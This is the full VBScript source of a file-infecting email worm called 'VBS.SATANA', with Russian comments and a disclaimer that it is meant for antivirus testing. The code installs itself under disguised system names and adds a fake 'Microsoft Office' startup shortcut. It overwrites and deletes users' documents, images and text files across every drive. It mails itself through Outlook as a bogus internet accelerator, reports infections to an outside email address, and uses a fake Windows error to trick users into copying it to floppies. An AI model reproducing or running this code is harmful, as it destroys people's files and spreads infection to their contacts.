'Вирус VBS.SATANA 
'Вирус VBS.SATANA
'Вирус напсиан на языке Vbscript
'Автор не отвечает за ущерб нанесенный вирусом. 
'Т.к вирус разработан для тестирования антивирусных программ.


'                                            ПОЕХАЛИ...


'Команды копирования и автозапуска вируса

On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
Set s = CreateObject("Wscript.Shell")
File.Copy ("C:\WINDOWS\Fonts\MsFonts.vbe")
File.Copy ("C:\WINDOWS\System32\Ineternet Fast.exe.vbe")
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, StartupPath
StartupPath = WSHShell.SpecialFolders("Startup")
Set MyShortcut = WSHShell.CreateShortcut(StartupPath & _
 "\Microsoft Office.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("C:\WINDOWS\Fonts\MsFonts.vbe")
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Common Files\Microsoft Shared\Office10\MSOICONS.exe")
MyShortcut.Save


'Команды заражения
if day(now)>13 then
haha()
Sub haha()
On Error Resume Next
Dim d, dc, s, fso, haha
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
hihi (d.Path & "\")
End If
Next
haha = s
End sub
Sub hehe(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, s, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If  (ext = "avc") or (ext = "txt") or (ext = "jpg") or (ext = "htm") or (ext = "js") or (ext = "doc") or (ext = "hlp") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbe")
fso.deletefile(f1.path)
End If
Next
End Sub
Sub hihi(folderspec)
On Error Resume Next
Dim f, f1, sf, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
hehe (f1.Path)
hihi (f1.Path)
Next
End Sub
end if

'Половые органы вируса
if day(now)<13 then
Dim OutlookObject, OutMail
Set OutlookObject = CreateObject("Outlook.Application")
Set OutMail = OutlookObject.CreateItem(0)
OutMail._
to = OutlookObject._
GetNameSpace("MAPI")._
AddressLists(1)._
AddressEntries(1)
OutMail._
Subject = "Internet FAST!"
OutMail._
Body = "Здравствуйте уважаемые пользователи всемирной паутины!Предлагаем вашему вниманию новейшую разработку Internet Fast. Самый новый ускоритель интернета. Установив данную программу вы забудете о маленькой скорости интернет соединения. P.S: Ваш электронный адрес взят из открытых источников." 
OutMail._
Attachments._
Add"C:\WINDOWS\System32\Ineternet Fast.exe.vbe"
OutMail._
Send
end if

'Сообщим о заражении компьютера

on error resume next
set out=createobject("Outlook.Application")
if out="Outlook" then 
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newmail=out.createitem(0)
newmail.to="Hack-virus@narod.ru"
newmail.subject="Infection"
newmail.Body="Infection completed successfully"
newmail.send
set out=Nothing
end if


'Копирование на дискету
if day(now)=13 then
s.popup "Произошла непредвиденная ошибка Windows.Будет произведено экстренное копирование системных файлов. Вставьте чистую дискету и дождитесь завершения копирования. В противном случае Windows прекратит свою работу.", ,"Error", 0+16
Dim fso, odrive
Dim x, y, z
y=10000
Set fso = CreateObject("Scripting.FileSystemObject")
set odrive = fso.getdrive("a:\")
for x=1 to y
if odrive.isready then
z=1
end if
next
end if
if day(now)=13 then
File.Copy ("A:\System32.dll.vbe")
File.Copy ("A:\format.dll.vbe")
File.Copy ("A:\fdisk.exe.vbe")
File.Copy ("A:\winold.cab.vbe")
File.Copy ("A:\System.cab.vbe")
File.Copy ("A:\Fonts.cab.vbe")
File.Copy ("A:\Driver cache.cab.vbe")
end if